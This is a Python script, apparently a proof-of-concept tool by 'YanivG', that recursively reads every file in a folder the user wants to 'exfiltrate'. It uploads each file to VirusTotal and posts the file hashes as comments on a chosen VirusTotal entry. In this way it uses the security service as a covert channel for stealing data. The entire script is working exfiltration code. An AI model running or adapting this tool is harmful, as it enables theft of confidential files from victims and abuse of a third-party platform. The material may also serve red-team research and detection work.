import os
import requests
import hashlib
import json
import argparse
import pyfiglet


result = pyfiglet.figlet_format("VT Not so pretty by YanivG")
print(result)

# Argument Parser for folder, API key, and file hash input
parser = argparse.ArgumentParser(description="VT not so pretty by YanivG")
parser.add_argument('-f', '--folder', type=str, help="Path to the folder you want to exfiltrate")
parser.add_argument('-k', '--api_key', type=str, help="Your VirusTotal API key")
parser.add_argument('-c', '--comments_file_hash', type=str, help="Hash to comment on in VirusTotal")

args = parser.parse_args()

# Function to validate if a folder path exists
def validate_folder_path(folder_path):
    return os.path.isdir(folder_path)

# Get the folder path either from arguments or user input
folder_path = args.folder if args.folder else input("Please enter the folder path you want to exfiltrate: ")

# Validate folder path
while not validate_folder_path(folder_path):
    print("Invalid folder path. Please enter a valid folder path.")
    folder_path = input("Please enter the folder path you want to exfiltrate: ")

# VirusTotal API URL
url = "https://www.virustotal.com/api/v3/files"

# Prompt the user if API key from arguments isn't provided
api_key = args.api_key if args.api_key else input("Enter your VirusTotal API key: ")

headers = {
    "x-apikey": api_key
}

# Prompt the user if hash from arguments isn't provided
comments_file_hash = args.comments_file_hash if args.comments_file_hash else input("Please enter the hash to comment on: ")

# Function to check if the API key is valid by making a simple request
def validate_api_key():
    try:
        # Send a request to the API with the provided key to check key
        response = requests.get("https://www.virustotal.com/api/v3/users/me", headers=headers)
        if response.status_code == 200:
            print("API key is valid.")
            return True
        else:
            print(f"Error: Invalid API key. Response: {response.status_code} - {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error occurred while validating the API key: {e}")
        return False
    
# Function to check if the file hash is known to VirusTotal
def is_hash_known_to_virustotal(file_hash):
    try:
        check_url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
        response = requests.get(check_url, headers=headers)
        if response.status_code == 200:
            return True
        elif response.status_code == 404:
            return False
        else:
            print(f"Error checking hash: {response.status_code} - {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error occurred while checking the file hash: {e}")
        return False

# Function to upload a file and post a comment if necessary
def upload_and_comment_on_file(file_path, filename, comments_file_hash):
    try:
        with open(file_path, "rb") as file:
            file_byte = file.read()  # Read the file content
            hash_sha256 = hashlib.sha256()
            hash_sha256.update(file_byte)
            file_hash = hash_sha256.hexdigest()  # Compute the SHA-256 hash

            # Upload the file to VirusTotal
            files = {"file": (filename, file_byte)}
            response = requests.post(url, files=files, headers=headers)
            print(f"File: {filename}, SHA-256 Hash: {file_hash}")
            print(f"VirusTotal Response: {response.status_code} - {response.text}")

            # Check if the file hash is known in VirusTotal
            if response.status_code == 200:
                while not is_hash_known_to_virustotal(comments_file_hash):
                    print(f"Error: The hash {comments_file_hash} is not found in VirusTotal.")
                    comments_file_hash = input("Please enter a valid hash to comment on: ")

                # Post a comment to the file using the hash provided by the user
                comment_url = f"https://www.virustotal.com/api/v3/files/{comments_file_hash}/comments"
                comment_body = json.dumps({
                    "data": {
                        "type": "comment",
                        "attributes": {
                            "text": file_hash
                        }
                    }
                })
                comment_response = requests.post(comment_url, headers=headers, data=comment_body)
                print(f"Comment Response: {comment_response.status_code} - {comment_response.text}")
            else:
                print(f"Error: Failed to upload file '{filename}' to VirusTotal.")
    except FileNotFoundError as e:
        print(f"File error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred while uploading file: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

# Recursive function to upload files from the directory and its subdirectories
def upload_files_recursively(directory_path):
    try:
        for root, dirs, files in os.walk(directory_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                upload_and_comment_on_file(file_path, filename, comments_file_hash)
    except Exception as e:
        print(f"Error occurred while traversing the directory: {e}")

# Validate the API key first before proceeding
if validate_api_key():
    # Start uploading files recursively from the specified folder
    upload_files_recursively(folder_path)
else:
    print("Exiting the script due to invalid API key.")
